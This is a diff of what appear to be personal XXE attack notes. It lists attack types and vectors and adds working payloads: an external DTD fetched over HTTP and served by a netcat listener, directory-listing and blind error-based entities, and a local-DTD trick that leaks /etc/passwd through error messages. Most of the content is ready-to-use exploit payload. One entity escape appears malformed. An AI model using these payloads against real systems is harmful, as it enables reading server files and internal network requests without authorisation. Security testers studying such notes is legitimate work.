@@ -1,5 +1,27 @@
 XXE Payloads
 
+
+--exploits xml document processing library used by application
+--most commonly exploitable in applications that use xml to parse asynchronous (AJAX) data between the client and server
+	--esp. when the server expects xml input from client
+External entities are arbitrary xml entity declarations whoe values are defined outside of the DTD context in which they are declared
+
+XXE Payload Attack Types
+	file read/file retrieval
+		file write
+	SSRF via XXE
+	OOB XXE
+	Blind XXE File Retrieval
+		timing-based
+		error-based
+	Command Execution vis XXE
+
+XXE Attack Vectors
+	xml input
+	XInclude
+	file upload
+	modified content type
+
 External DTD file
 <!ENTITY % dtd SYSTEM "http://127.0.0.1/payload.dtd"> %dtd;
 nc -lvp 80 < payload.dtd
@@ -48,6 +70,7 @@ Directory listing payload
 <something>ls: %ent;</something>
 
 BLIND XXE (error-based)
+	Example 1:
 Test for filesystem access by requesting a non-existant file
 Request payload:
 <?xml version="1.0" ?>
@@ -55,6 +78,17 @@ Request payload:
 <!ENTITY % ext SYSTEM "file:///etc/passwdxyz"> %ext;
 ]>
 <r></r>
+	Example 2:
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/data/schema.dtd">
+<!ENTITY % arbitrary_entity '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &$x26;&#x25; error SYSTEM &#x27;file:////DNE/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
 Vulnerable Response:
 some variation of content is malformed or target file not accessible
 
